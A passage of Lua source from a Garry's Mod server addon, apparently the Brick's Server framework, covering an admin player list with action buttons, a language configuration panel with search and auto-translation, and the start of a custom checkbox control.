        for k, v in ipairs( self.slotPanels ) do
            local nextPanel = k == #self.slotPanels and self.slotPanels[1] or self.slotPanels[k+1]
            if( v.slotCount != 0 and v.slotCount > nextPanel.slotCount ) then continue end

            slotParent = v
            v.slotCount = v.slotCount+1
            v.targetHeight = v:GetTall()+self.slotTall+(v.slotCount == 1 and 0 or self.spacing)
            v:SetTall( v.targetHeight )
            break
        end

        local playerBack = vgui.Create( "DPanel", slotParent )
        playerBack:Dock( TOP )
        playerBack:DockMargin( 0, 0, 0, self.spacing )
        playerBack:SetTall( self.slotTall )
        playerBack.Paint = function( self2, w, h )
            draw.RoundedBox( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
        end

        local name = v:Nick()
        local steamID = v:SteamID()

        local group = BRICKS_SERVER.Func.GetGroup( v )
        local rankName = group and group[1] or BRICKS_SERVER.Func.GetAdminGroup( v )

        surface.SetFont( "BRICKS_SERVER_Font23" )
        local nameX, nameY = surface.GetTextSize( name )

        surface.SetFont( "BRICKS_SERVER_Font18" )
        local textX, textY = surface.GetTextSize( rankName )
        local boxW, boxH = textX+10, textY+3

        local playerInfo = vgui.Create( "DPanel", playerBack )
        playerInfo:Dock( TOP )
        playerInfo:SetTall( self.slotTall )
        local alpha = 0
        playerInfo.Paint = function( self2, w, h )
            if( not IsValid( self2.button ) ) then return end

            -- BUTTON PAINT --
            local expanded = playerBack:GetTall() > self.slotTall

            if( expanded ) then
                alpha = math.Clamp( alpha+5, 0, 75 )
            elseif( not self2.button:IsDown() and self2.button:IsHovered() ) then
                alpha = math.Clamp( alpha+5, 0, 100 )
            else
                alpha = math.Clamp( alpha-5, 0, 100 )
            end

            draw.RoundedBoxEx( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ), true, true, not expanded, not expanded )

            surface.SetAlphaMultiplier( alpha/255 )
            draw.RoundedBoxEx( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 1 ), true, true, not expanded, not expanded )
            surface.SetAlphaMultiplier( 1 )

            -- INFO --
            draw.SimpleText( name, "BRICKS_SERVER_Font23", h+5, h/2+2, BRICKS_SERVER.Func.GetTheme( 6 ), 0, TEXT_ALIGN_BOTTOM )
            draw.SimpleText( steamID != "NULL" and steamID or "BOT", "BRICKS_SERVER_Font17", h+5, h/2-2, BRICKS_SERVER.Func.GetTheme( 6, 75 ), 0, 0 )

            draw.RoundedBox( 8, h+5+nameX+5, (h/2+2)-boxH-3, boxW, boxH, ((group or {})[3] or BRICKS_SERVER.Func.GetTheme( 5 )) )
            draw.SimpleText( rankName, "BRICKS_SERVER_Font18", h+5+nameX+5+(boxW/2), (h/2+2-3)-(boxH/2), BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
        end

        local playerAvatar = vgui.Create( "bricks_server_rounded_avatar", playerInfo )
        local size = playerInfo:GetTall()-10
        playerAvatar:SetSize( size, size )
        playerAvatar:SetPos( 5, 5 )
        playerAvatar.rounded = 8
        playerAvatar:SetPlayer( v, 128 )

        playerInfo.button = vgui.Create( "DButton", playerInfo )
        playerInfo.button:Dock( FILL )
        playerInfo.button:SetText( "" )
        playerInfo.button.textureRotation = -90
        playerInfo.button.Paint = function( self2, w, h ) end
        playerInfo.button.DoClick = function()
            playerBack.Expanded = not playerBack.Expanded

            if( playerBack.Expanded ) then
                slotParent.targetHeight = slotParent.targetHeight+playerBack.expandedExtraH
                playerBack:SizeTo( self.slotWide, self.slotTall+playerBack.expandedExtraH, 0.2 )
            else
                slotParent.targetHeight = slotParent.targetHeight-playerBack.expandedExtraH
                playerBack:SizeTo( self.slotWide, self.slotTall, 0.2 )
            end

            slotParent:SizeTo( self.slotWide, slotParent.targetHeight, 0.2 )
        end

        local actionPanelW, actionPanelH = self.slotWide-20, 40
        local function setChildrenWidths( parent )
            if( not parent ) then return end

            local totalChildrenW = 0
            local children = parent:GetChildren()
            for k, v in ipairs( children ) do
                totalChildrenW = totalChildrenW+v:GetWide()
            end

            for k, v in ipairs( children ) do
                v:SetWide( (v:GetWide()/totalChildrenW)*(actionPanelW-(#children-1)*5) )
            end
        end

        local actionPanels = {}
        for key, val in pairs( actionCategories ) do
            for key2, val2 in pairs( val ) do
                surface.SetFont( "BRICKS_SERVER_Font21" )
                local textX, textY = surface.GetTextSize( key .. " " .. val2[1] )
                textX = textX+30

                if( not actionPanels[#actionPanels] or actionPanels[#actionPanels].totalButtonW+textX > actionPanelW ) then
                    if( actionPanels[#actionPanels] ) then
                        setChildrenWidths( actionPanels[#actionPanels] )
                    end

                    actionPanels[#actionPanels+1] = vgui.Create( "DPanel", playerBack )
                    actionPanels[#actionPanels]:Dock( TOP )
                    actionPanels[#actionPanels]:DockMargin( 10, #actionPanels == 1 and 10 or 0, 10, 5 )
                    actionPanels[#actionPanels]:SetTall( actionPanelH )
                    actionPanels[#actionPanels].totalButtonW = 0
                    actionPanels[#actionPanels].Paint = function() end
                end

                actionPanels[#actionPanels].totalButtonW = actionPanels[#actionPanels].totalButtonW+textX+(actionPanels[#actionPanels].totalButtonW != 0 and 5 or 0)

                local playerAction = vgui.Create( "DButton", actionPanels[#actionPanels] )
                playerAction:Dock( LEFT )
                playerAction:SetText( "" )
                playerAction:DockMargin( 0, 0, 5, 0 )
                playerAction:SetWide( textX )
                local alpha = 0
                playerAction.Paint = function( self2, w, h )
                    if( self2:IsHovered() ) then
                        alpha = math.Clamp( alpha+10, 0, 75 )
                    else
                        alpha = math.Clamp( alpha-10, 0, 75 )
                    end
                    
                    draw.RoundedBox( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3, 150 ) )
                    draw.RoundedBox( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2, alpha ) )

                    BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 2, 200 ), 8 )
            
                    draw.SimpleText( key .. " " .. val2[1], "BRICKS_SERVER_Font21", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6, 75+((alpha/75)*180) ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
                end
                playerAction.DoClick = function()
                    val2[3]( v )
                end
            end
        end
        setChildrenWidths( actionPanels[#actionPanels] )

        playerBack.expandedExtraH = 20+(#actionPanels*actionPanelH)+((#actionPanels-1)*5)
    end
end

function PANEL:Think()
    if( not self.loadedPlayers ) then return end

    for k, v in pairs( self.loadedPlayers ) do
        if( not IsValid( k ) ) then 
            self:Refresh()
            break 
        end
    end

    for k, v in player.Iterator() do
        if( not self.loadedPlayers[v] ) then 
            self:Refresh()
            break 
        end
    end
end

function PANEL:Paint( w, h )

end

vgui.Register( "bricks_server_admin", PANEL, "DPanel" )
--PATH addons/brick_s_server_framework/lua/bricks_server/vgui/bricks_server_config_languages.lua:
local PANEL = {}

function PANEL:Init()
    self.margin = 0

    local panelWide = ScrW()*0.6-BRICKS_SERVER.DEVCONFIG.MainNavWidth
    local panelTall = (ScrH()*0.65)-40

    local function CreateEditPopout( languageKey )
        if( IsValid( self.popout ) ) then
            self.popout:Remove()
        end

        local popoutClose = vgui.Create( "DPanel", self )
        popoutClose:SetSize( panelWide, panelTall )
        popoutClose:SetAlpha( 0 )
        popoutClose:AlphaTo( 255, 0.2 )
        popoutClose.Paint = function( self2, w, h )
            surface.SetDrawColor( 0, 0, 0, 150 )
            surface.DrawRect( 0, 0, w, h )
            BRICKS_SERVER.Func.DrawBlur( self2, 2, 2 )
        end

        local popoutWide, popoutTall = panelWide-panelWide*0.1, panelTall-panelWide*0.1

        self.popout = vgui.Create( "DPanel", self )
        self.popout:SetSize( 0, 0 )
        self.popout:SizeTo( popoutWide, popoutTall, 0.2 )
        self.popout.Paint = function( self2, w, h )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
        end
        self.popout.OnSizeChanged = function( self2 )
            self2:SetPos( (panelWide/2)-(self2:GetWide()/2), (panelTall/2)-(self2:GetTall()/2) )
        end
        self.popout.ClosePopout = function()
            if( IsValid( self.popout ) ) then
                self.popout:SizeTo( 0, 0, 0.2, 0, -1, function()
                    if( IsValid( self.popout ) ) then
                        self.popout:Remove()
                    end
                end )
            end

            popoutClose:AlphaTo( 0, 0.2, 0, function()
                if( IsValid( popoutClose ) ) then
                    popoutClose:Remove()
                end
            end )
        end

        local popoutCloseButton = vgui.Create( "DButton", self.popout )
        popoutCloseButton:Dock( BOTTOM )
        popoutCloseButton:SetTall( 40 )
        popoutCloseButton:SetText( "" )
        popoutCloseButton:DockMargin( 25, 0, 25, 25 )
        local changeAlpha = 0
        popoutCloseButton.Paint = function( self2, w, h )
            if( not self2:IsDown() and self2:IsHovered() ) then
                changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
            else
                changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
            end
            
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
    
            surface.SetAlphaMultiplier( changeAlpha/255 )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 4 ) )
            surface.SetAlphaMultiplier( 1 )

            BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 4 ) )
            
            draw.SimpleText( BRICKS_SERVER.Func.L( "cancel" ), "BRICKS_SERVER_Font20", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
        end
        popoutCloseButton.DoClick = self.popout.ClosePopout

        local originalLanguageTable = table.Copy( BRICKS_SERVER.Languages[languageKey] or {} )

        local topBar = vgui.Create( "DPanel", self.popout )
        topBar:Dock( TOP )
        topBar:SetTall( 40 )
        topBar:DockMargin( 25, 25, 25, 0 )
        topBar.Paint = function( self2, w, h ) end

        local buttons = {
            {
                Title = "Auto Fill",
                Color = Color( 46, 204, 113 ),
                DoClick = function()
                    local options = { 
                        ["af"] = "Afrikaans",
                        ["ga"] = "Irish",
                        ["sq"] = "Albanian",
                        ["it"] = "Italian",
                        ["ja"] = "Japanese",
                        ["az"] = "Azerbaijani",
                        ["kn"] = "Kannada",
                        ["eu"] = "Basque",
                        ["ko"] = "Korean",
                        ["bn"] = "Bengali",
                        ["la"] = "Latin",
                        ["be"] = "Belarusian",
                        ["lv"] = "Latvian",
                        ["bg"] = "Bulgarian",
                        ["ca"] = "Catalan",
                        ["mk"] = "Macedonian",
                        ["zh-CN"] = "Chinese Simplified",
                        ["ms"] = "Malay",
                        ["zh-TW"] = "Chinese Traditional",
                        ["mt"] = "Maltese",
                        ["hr"] = "Croatian",
                        ["no"] = "Norwegian",
                        ["cs"] = "Czech",
                        ["fa"] = "Persian",
                        ["da"] = "Danish",
                        ["pl"] = "Polish",
                        ["nl"] = "Dutch",
                        ["ro"] = "Romanian",
                        ["eo"] = "Esperanto",
                        ["ru"] = "Russian",
                        ["et"] = "Estonian",
                        ["sr"] = "Serbian",
                        ["tl"] = "Filipino",
                        ["sk"] = "Slovak",
                        ["fi"] = "Finnish",
                        ["sl"] = "Slovenian",
                        ["fr"] = "French",
                        ["es"] = "Spanish",
                        ["gl"] = "Galician",
                        ["sw"] = "Swahili",
                        ["ka"] = "Georgian",
                        ["de"] = "German",
                        ["ta"] = "Tamil",
                        ["el"] = "Greek",
                        ["te"] = "Telugu",
                        ["gu"] = "Gujarati",
                        ["th"] = "Thai",
                        ["ht"] = "Haitian Creole",
                        ["tr"] = "Turkish",
                        ["iw"] = "Hebrew",
                        ["uk"] = "Ukrainian",
                        ["hi"] = "Hindi",
                        ["ur"] = "Urdu",
                        ["hu"] = "Hungarian",
                        ["vi"] = "Vietnamese",
                        ["is"] = "Icelandic",
                        ["cy"] = "Welsh",
                        ["id"] = "Indonesian",
                        ["yi"] = "Yiddish"
                    }
                    for k, v in pairs( {} ) do
                        options[k] = k
                    end
                    
                    BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), "What language would you like to auto fill?", "None", options, function( value, data ) 
                        if( options[data] ) then
                            local stringsToTranslate = {}
                            for k, v in pairs( BRICKS_SERVER.Languages["english"] ) do
                                local textEntry = self.popout.textEntries[k]
        
                                if( not IsValid( textEntry ) ) then continue end
        
                                table.insert( stringsToTranslate, { k, v, textEntry } )
                            end
        
                            local function translateNext()
                                if( not IsValid( self ) or not self:IsVisible() ) then return end
        
                                if( #stringsToTranslate <= 0 ) then return end
        
                                local nextStringTable = stringsToTranslate[1]
        
                                if( not nextStringTable ) then return end
        
                                if( not IsValid( nextStringTable[3] ) ) then
                                    table.remove( stringsToTranslate, 1 )
                                    translateNext()
                                    return
                                end
        
                                nextStringTable[3]:GetParent().translating = true
        
                                BRICKS_SERVER.Func.GetTranslatedString( data, nextStringTable[2], function( translatedString, errorMsg )
                                    if( not translatedString or errorMsg or not IsValid( nextStringTable[3] ) ) then
                                        print( "TRANSLATING ERROR: " .. (errorMsg or "UNKNOWN") )
        
                                        BRICKS_SERVER.Func.Message( "Your IP has been temporarily blocked by Google, please try again later.", BRICKS_SERVER.Func.L( "admin" ), "Confirm" )
        
                                        nextStringTable[3]:GetParent().translating = nil
                                        return
                                    else
                                        nextStringTable[3]:SetValue( translatedString )
                                    end
        
                                    table.remove( stringsToTranslate, 1 )
        
                                    timer.Simple( 0.5, function() 
                                        if( IsValid( nextStringTable[3] ) ) then
                                            nextStringTable[3]:GetParent().translating = nil
                                        end
        
                                        translateNext() 
                                    end )
                                end )
                            end
                            translateNext()
                        else
                            notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
                        end
                    end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
                end
            },
            {
                Title = "Reset Changes",
                Color = Color( 231, 76, 60 ),
                DoClick = function()
                    if( not BS_ConfigCopyTable.LANGUAGE.Languages or not BS_ConfigCopyTable.LANGUAGE.Languages[languageKey] ) then return end
        
                    BS_ConfigCopyTable.LANGUAGE.Languages[languageKey][2] = {}
        
                    BRICKS_SERVER.Func.ConfigChange( "LANGUAGE" )
                    self.popout.RefreshLanguageStrings()
                end
            },
        }

        if( isnumber( languageKey ) ) then
            table.insert( buttons, {
                Title = "Delete",
                Color = Color( 231, 76, 60 ),
                DoClick = function()
                    if( not BS_ConfigCopyTable.LANGUAGE.Languages or not BS_ConfigCopyTable.LANGUAGE.Languages[languageKey] ) then return end
        
                    if( isnumber( languageKey ) ) then
                        BS_ConfigCopyTable.LANGUAGE.Languages[languageKey] = nil
                    end
        
                    BRICKS_SERVER.Func.ConfigChange( "LANGUAGE" )
                    self.popout.ClosePopout()

                    self.RefreshPanel()
                end
            } )

            table.insert( buttons, {
                Title = "Edit Name",
                Color = Color( 127, 140, 141 ),
                DoClick = function()
                    if( not BS_ConfigCopyTable.LANGUAGE.Languages or not BS_ConfigCopyTable.LANGUAGE.Languages[languageKey] ) then return end
        
                    if( isnumber( languageKey ) ) then
                        BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), (BS_ConfigCopyTable.LANGUAGE.Languages[languageKey][1] or ""), function( text ) 
                            BS_ConfigCopyTable.LANGUAGE.Languages[languageKey][1] = text
                            self.RefreshPanel()
                            BRICKS_SERVER.Func.ConfigChange( "LANGUAGE" )
                        end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
                    end
                end
            } )
        end

        for k, v in ipairs( buttons ) do
            surface.SetFont( "BRICKS_SERVER_Font20" )
            local textX, textY = surface.GetTextSize( v.Title )
    
            local button = vgui.Create( "DButton", topBar )
            button:Dock( RIGHT )
            button:DockMargin( 5, 0, 0, 0 )
            button:SetText( "" )
            button:SetWide( textX+20 )
            local changeAlpha = 0
            button.Paint = function( self2, w, h )
                if( self2:IsDown() or self2.m_bSelected ) then
                    changeAlpha = math.Clamp( changeAlpha+10, 5, 50 )
                elseif( self2:IsHovered() ) then
                    changeAlpha = math.Clamp( changeAlpha+10, 5, 25 )
                else
                    changeAlpha = math.Clamp( changeAlpha-10, 5, 50 )
                end
        
                surface.SetAlphaMultiplier( changeAlpha/255 )
                draw.RoundedBox( 5, 0, 0, w, h, v.Color or BRICKS_SERVER.Func.GetTheme( 4 ) )
                surface.SetAlphaMultiplier( 1 )
        
                draw.SimpleText( v.Title, "BRICKS_SERVER_Font20", 10, h/2, (v.Color or BRICKS_SERVER.Func.GetTheme( 5 )), 0, TEXT_ALIGN_CENTER )
            end
            button.DoClick = v.DoClick
        end

        local searchBarBack = vgui.Create( "DPanel", topBar )
        searchBarBack:Dock( FILL )
        local search = Material( "materials/bricks_server/search.png" )
        local Alpha = 0
        local Alpha2 = 20
        local color1 = BRICKS_SERVER.Func.GetTheme( 2 )
        local searchBar
        searchBarBack.Paint = function( self2, w, h )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 1 ) )
    
            if( searchBar:IsEditing() ) then
                Alpha = math.Clamp( Alpha+5, 0, 100 )
                Alpha2 = math.Clamp( Alpha2+20, 20, 255 )
            else
                Alpha = math.Clamp( Alpha-5, 0, 100 )
                Alpha2 = math.Clamp( Alpha2-20, 20, 255 )
            end
            
            draw.RoundedBox( 5, 0, 0, w, h, Color( color1.r, color1.g, color1.b, Alpha ) )
        
            surface.SetDrawColor( 255, 255, 255, Alpha2 )
            surface.SetMaterial(search)
            local size = 24
            surface.DrawTexturedRect( w-size-(h-size)/2, (h-size)/2, size, size )
        end
    
        searchBar = vgui.Create( "bricks_server_search", searchBarBack )
        searchBar:Dock( FILL )
        searchBar:SetFont( "BRICKS_SERVER_Font20" )

        local scrollPanel = vgui.Create( "bricks_server_scrollpanel_bar", self.popout )
        scrollPanel:Dock( FILL )
        scrollPanel:DockMargin( 25, 10, 25, 10 )

        function self.popout.RefreshLanguageStrings()
            scrollPanel:Clear()

            self.popout.textEntries = {}

            local languageTable = {}
            if( (BS_ConfigCopyTable.LANGUAGE.Languages or {})[languageKey] ) then
                table.Merge( languageTable, (BS_ConfigCopyTable.LANGUAGE.Languages or {})[languageKey][2] or {} )
            end

            local count = 0
            local languageStringCount = table.Count( BRICKS_SERVER.Languages["english"] )
            for k, v in pairs( BRICKS_SERVER.Languages["english"] ) do
                if( (searchBar:GetValue() or "") != "" and not string.find( string.lower( v ), string.lower( searchBar:GetValue() or "" ) ) and not string.find( string.lower( languageTable[k] or v ), string.lower( searchBar:GetValue() or "" ) ) ) then
                    continue
                end

                count = count+1

                local currentCount = count

                local languageBack = vgui.Create( "DPanel", scrollPanel )
                languageBack:Dock( TOP )
                languageBack:DockMargin( 0, 0, 10, 0 )
                languageBack:SetTall( 40 )
                languageBack.Paint = function( self2, w, h )
                    if( currentCount == 1 ) then
                        draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 1 ), true, true, false, false )
                    elseif( currentCount >= languageStringCount ) then
                        draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 1 ), false, false, true, true )
                    else
                        surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 1 ) )
                        surface.DrawRect( 0, 0, w, h )
                    end

                    if( self2.translating ) then
                        if( currentCount == 1 ) then
                            draw.RoundedBoxEx( 5, w/2+1, 0, w/2-1, h, BRICKS_SERVER.Func.GetTheme( 3 ), false, true, false, false )
                        elseif( currentCount >= languageStringCount ) then
                            draw.RoundedBoxEx( 5, w/2+1, 0, w/2-1, h, BRICKS_SERVER.Func.GetTheme( 3 ), false, false, false, true )
                        else
                            surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3 ) )
                            surface.DrawRect( w/2+1, 0, w/2-1, h )
                        end
                    end

                    if( currentCount < languageStringCount ) then
                        surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 0 ) )
                        surface.DrawRect( 0, h-1, w, 1 )
                    end

                    surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 0 ) )
                    surface.DrawRect( w/2, 0, 1, h )
        
                    draw.SimpleText( v, "BRICKS_SERVER_Font20", 10, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), 0, TEXT_ALIGN_CENTER )
                end

                local languageTextEntry = vgui.Create( "bricks_server_textentry", languageBack )
                languageTextEntry:Dock( RIGHT )
                languageTextEntry:DockMargin( 0, 0, 10, 0 )
                languageTextEntry:SetWide( (popoutWide-50-20-30)/2 )
                languageTextEntry:SetValue( languageTable[k] or v )
                languageTextEntry:SetFont( "BRICKS_SERVER_Font20" )
                languageTextEntry:SetUpdateOnType( true )
                languageTextEntry.OnValueChange = function( self2, value )
                    if( not BS_ConfigCopyTable.LANGUAGE.Languages ) then
                        BS_ConfigCopyTable.LANGUAGE.Languages = {}
                    end

                    if( not BS_ConfigCopyTable.LANGUAGE.Languages[languageKey] ) then
                        BS_ConfigCopyTable.LANGUAGE.Languages[languageKey] = { false, {} }
                    end

                    if( languageTextEntry:GetValue() != originalLanguageTable[k] ) then
                        BS_ConfigCopyTable.LANGUAGE.Languages[languageKey][2][k] = languageTextEntry:GetValue()
                    else
                        BS_ConfigCopyTable.LANGUAGE.Languages[languageKey][2][k] = nil
                    end
        
                    BRICKS_SERVER.Func.ConfigChange( "LANGUAGE" )
                end

                self.popout.textEntries[k] = languageTextEntry
            end
        end
        self.popout.RefreshLanguageStrings()

        searchBar.OnChange = function()
            self.popout.RefreshLanguageStrings()
        end
    end

    local scrollPanel = vgui.Create( "bricks_server_scrollpanel", self )
    scrollPanel:Dock( FILL )
    scrollPanel:DockMargin( 10, 10, 10, 10 )

    local languageSpacing = 10
    local gridWide = (ScrW()*0.6)-BRICKS_SERVER.DEVCONFIG.MainNavWidth-20
    local slotSize = 320
    local slotsWide = math.floor( gridWide/slotSize )
    local actualSlotSize = (gridWide-((slotsWide-1)*languageSpacing))/slotsWide

    local slotTall = 125
    local languageGrid = vgui.Create( "DIconLayout", scrollPanel )
    languageGrid:Dock( TOP )
    languageGrid:SetSpaceY( languageSpacing )
    languageGrid:SetSpaceX( languageSpacing )
    languageGrid:SetTall( slotTall )

    function self.RefreshPanel()
        languageGrid:Clear()

        local languages = {}
        for k, v in pairs( BRICKS_SERVER.Languages ) do
            local key = table.insert( languages, { k, table.Copy( v ) } )

            if( (BS_ConfigCopyTable.LANGUAGE.Languages or {})[k] ) then
                table.Merge( languages[key][2], (BS_ConfigCopyTable.LANGUAGE.Languages or {})[k][2] )
            end
        end

        for k, v in pairs( BS_ConfigCopyTable.LANGUAGE.Languages or {} ) do
            if( not v[1] ) then continue end

            table.insert( languages, { k, v[2], v[1] } )
        end

        for k, v in pairs( languages ) do
            languageGrid.slots = (languageGrid.slots or 0)+1
            local slots = languageGrid.slots
            local slotsTall = math.ceil( slots/slotsWide )
            languageGrid:SetTall( (slotsTall*slotTall)+((slotsTall-1)*languageSpacing) )

            local missingLanguageStrings = math.max( 0, table.Count( BRICKS_SERVER.Languages["english"] or {} ) - table.Count( v[2] ) )

            local languageBack = vgui.Create( "DPanel", languageGrid )
            languageBack:SetSize( actualSlotSize, slotTall )
            languageBack.Paint = function( self2, w, h )
                draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )

                draw.SimpleText( string.upper( v[3] or v[1] ), "BRICKS_SERVER_Font25", w/2, h/3, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM )

                if( missingLanguageStrings > 0 ) then
                    draw.SimpleText( missingLanguageStrings .. " missing language strings", "BRICKS_SERVER_Font20", w/2, h/3, BRICKS_SERVER.DEVCONFIG.BaseThemes.Red, TEXT_ALIGN_CENTER, 0 )
                else
                    draw.SimpleText( missingLanguageStrings .. " missing language strings", "BRICKS_SERVER_Font20", w/2, h/3, BRICKS_SERVER.DEVCONFIG.BaseThemes.Green, TEXT_ALIGN_CENTER, 0 )
                end
            end

            local languageEditButton = vgui.Create( "DButton", languageBack )
            languageEditButton:SetSize( 36, 36 )
            languageEditButton:SetPos( actualSlotSize-10-languageEditButton:GetWide(), 10 )
            languageEditButton:SetText( "" )
            local alpha = 0
            local editMat = Material( "materials/bricks_server/edit.png" )
            languageEditButton.Paint = function( self2, w, h )
                if( not self2:IsDown() and self2:IsHovered() ) then
                    alpha = math.Clamp( alpha+10, 0, 95 )
                else
                    alpha = math.Clamp( alpha-10, 0, 95 )
                end

                surface.SetAlphaMultiplier( alpha/255 )
                draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
                surface.SetAlphaMultiplier( 1 )

                BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 1 ) )

                surface.SetMaterial( editMat )
                local size = 24
                surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6 ) )
                surface.DrawTexturedRect( (h-size)/2, (h-size)/2, size, size )
            end
            languageEditButton.DoClick = function()
                CreateEditPopout( v[1] )
            end

            local languageButton = vgui.Create( "DButton", languageBack )
            languageButton:Dock( BOTTOM )
            languageButton:DockMargin( 10, 10, 10, 10 )
            languageButton:SetTall( 40 )
            languageButton:SetText( "" )
            local alpha = 0
            languageButton.Paint = function( self2, w, h )
                local buttonText, buttonColor, buttonDownColor = BRICKS_SERVER.Func.L( "unselected" ), BRICKS_SERVER.Func.GetTheme( 2 ), BRICKS_SERVER.Func.GetTheme( 1 )

                if( (BS_ConfigCopyTable.LANGUAGE.Language or "english") == v[1] ) then
                    buttonText, buttonColor, buttonDownColor = BRICKS_SERVER.Func.L( "selected" ), BRICKS_SERVER.Func.GetTheme( 5 ), BRICKS_SERVER.Func.GetTheme( 4 )
                end

                if( not self2:IsDown() and self2:IsHovered() ) then
                    alpha = math.Clamp( alpha+5, 0, 200 )
                else
                    alpha = math.Clamp( alpha-5, 0, 255 )
                end

                draw.RoundedBox( 5, 0, 0, w, h, buttonColor )

                surface.SetAlphaMultiplier( alpha/255 )
                draw.RoundedBox( 5, 0, 0, w, h, buttonDownColor )
                surface.SetAlphaMultiplier( 1 )

                BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, buttonDownColor )

                draw.SimpleText( buttonText, "BRICKS_SERVER_Font20", w/2, h/2-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
            end
            languageButton.DoClick = function()
                if( (BS_ConfigCopyTable.LANGUAGE.Language or "") == v[1] ) then return end

                BS_ConfigCopyTable.LANGUAGE.Language = v[1]
                BRICKS_SERVER.Func.ConfigChange( "LANGUAGE" )
            end
        end

        -- Create new
        languageGrid.slots = (languageGrid.slots or 0)+1
        local slots = languageGrid.slots
        local slotsTall = math.ceil( slots/slotsWide )
        languageGrid:SetTall( (slotsTall*slotTall)+((slotsTall-1)*languageSpacing) )

        local createNewBack = vgui.Create( "DPanel", languageGrid )
        createNewBack:SetSize( actualSlotSize, slotTall )
        createNewBack.Paint = function( self2, w, h )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )

            draw.SimpleText( BRICKS_SERVER.Func.L( "createNew" ), "BRICKS_SERVER_Font25", w/2, h/3, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM )

            draw.SimpleText( BRICKS_SERVER.Func.L( "createNewLanguage" ), "BRICKS_SERVER_Font20", w/2, h/3, BRICKS_SERVER.Func.GetTheme( 5 ), TEXT_ALIGN_CENTER, 0 )
        end

        local createNewButton = vgui.Create( "DButton", createNewBack )
        createNewButton:Dock( BOTTOM )
        createNewButton:DockMargin( 10, 10, 10, 10 )
        createNewButton:SetTall( 40 )
        createNewButton:SetText( "" )
        local alpha = 0
        createNewButton.Paint = function( self2, w, h )
            if( not self2:IsDown() and self2:IsHovered() ) then
                alpha = math.Clamp( alpha+5, 0, 200 )
            else
                alpha = math.Clamp( alpha-5, 0, 255 )
            end

            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )

            surface.SetAlphaMultiplier( alpha/255 )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 4 ) )
            surface.SetAlphaMultiplier( 1 )

            BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 4 ) )

            draw.SimpleText( BRICKS_SERVER.Func.L( "create" ), "BRICKS_SERVER_Font20", w/2, h/2-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
        end
        createNewButton.DoClick = function()
            if( not BS_ConfigCopyTable.LANGUAGE.Languages ) then
                BS_ConfigCopyTable.LANGUAGE.Languages = {}
            end

            table.insert( BS_ConfigCopyTable.LANGUAGE.Languages, { "New Language", {} } )
            self.RefreshPanel()

            BRICKS_SERVER.Func.ConfigChange( "LANGUAGE" )
        end
    end
    self.RefreshPanel()
end

function PANEL:Paint( w, h )

end

vgui.Register( "bricks_server_config_languages", PANEL, "DPanel" )
--PATH addons/brick_s_server_framework/lua/bricks_server/vgui/bricks_server_dcheckbox.lua:
local PANEL = {}

function PANEL:Init()
	self:SetSize( 45, 50 )

	self.toggle = vgui.Create( "DButton", self )
	self.toggle:Dock( LEFT )
	self.toggle:SetWide( 45 )
	self.toggle:SetText( "" )
	self.toggle.xPos = 0
	self.toggle.Paint = function( self2, w, h )
		local backH = 16
		local circleRadius = math.min( h/2, (backH/2)*1.35 )
		self2.minXPos, self2.maxXPos = circleRadius, w-circleRadius

